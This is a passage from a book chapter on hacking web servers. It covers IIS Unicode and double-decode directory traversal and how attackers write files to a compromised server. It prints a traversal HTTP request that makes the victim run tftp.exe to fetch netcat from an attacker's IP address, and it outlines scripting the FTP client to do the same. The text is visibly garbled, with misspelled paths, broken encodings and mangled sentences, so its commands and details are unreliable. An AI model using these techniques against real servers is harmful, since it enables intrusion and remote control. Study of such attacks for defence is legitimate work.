  md: '# Chapter 3: Hacking Web Servers


    executables don not exist on the volume where the Web site is rooted, and directory
    traversal makes looking trivial.


    Commands fired off via Unicode are executed in the context of the remote user
    making the HTTP request. Typically, this is the IUSR_machinename account used
    to impersonate anonymous Web requests, which is a member of the Guests built-in
    group and has highly restricted privileges on default Windows NT/2000 systems.


    Although the scope of the compromise is initially limited by these, if further
    exposures can be identified on a vulnerable server, the situation can quickly
    become much worse. As we will see shortly, a combination of issues can turn directory
    traversal into a security problem.

    If nonprivileged or anonymous users possesses the capability to write to disk
    a Web server, security breach is usually not far off the offing. Unfortunately,
    the out-of-the-default ACLs allow Everyone:Full Control on C:\Innetup\scripts,
    and several other directories, making this a real possibility. Vulnerabilities
    like this are running the Unicode and double decode directory traversal when writing
    to disk nearly trivial, as we describe.


    # Downloading Files Using SMB, FTP, or TFTP


    Assuming an appropriate target directory can be identified, techniques for writing
    to it depending on what the firewall allows to/from the target Web server.

    If the firewall allows outbound SMB (TCP 139) and/or 445, files can be sucked
    from a remote attacker''s system using Windows-in file sharing.

    If FTP (TCP 21) and/or TFTP (UDP 69) are available, a common play is to use the
    FTP or TFTP client on the target machine to upload files from a remote attacker''s
    system (which is running on an FTP or TFTP server). Some examples of commands
    to perform this trick are:

    Uploading nearly using TFTP is simple. First, set up a TFTP server on the attacker''s
    system (192.168.234.31, in this example). Then, run the following on the victim
    using a directory traversal exploit like Unicode:


    ```

    GET /scripts/..%250c/%winet/system32/tftp.exe

    -u="192.168.234.31&C=\nc.exe HTTP/1.0

    ```


    Note that this example refers to C:, as it is writable by default. Also, not if
    C:\nc.exe allows except, you get an error stating "ftp:can''t write to local file
    ''C:\nnc.exe.''" A successful transfer should return an HTTP 502 Gateway Error
    with a header message like this: "Transfer success: 59392 bytes in 1 second, 59392
    bytes/s.\nUsing FTP is more difficult, but it''s more likely to be allowed outbound
    from the target. The goal is first to create an arbitrary file (let''s call it
    ftptmp) on the target machine, which is then used to script the FTP client using
    the -s:filename. The script instructs the FTP client to connect to the attacker''s
    machine and download netcat. Before you can create this file, however, you need
    to overcome one obstacle.'
